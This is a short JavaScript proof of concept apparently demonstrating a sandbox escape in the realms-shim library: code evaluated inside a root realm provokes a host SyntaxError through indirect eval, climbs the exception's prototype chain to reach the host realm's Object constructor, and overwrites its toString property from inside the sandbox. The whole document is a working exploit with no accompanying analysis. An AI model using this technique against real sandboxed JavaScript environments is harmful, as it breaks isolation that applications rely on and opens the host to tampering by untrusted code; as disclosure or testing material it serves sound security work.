let Realm = require('realms-shim');

const r = Realm.makeRootRealm();
r.evaluate(`let HostException;
try{
     (0, eval)('--'+'>');
}catch(e){
     HostException = e;
}
const HostObject = HostException.__proto__.__proto__.__proto__.constructor;
HostObject.toString = 233333; // messed with the global object
`);

//the code delete toString on globalObject
console.log(Object.toString);
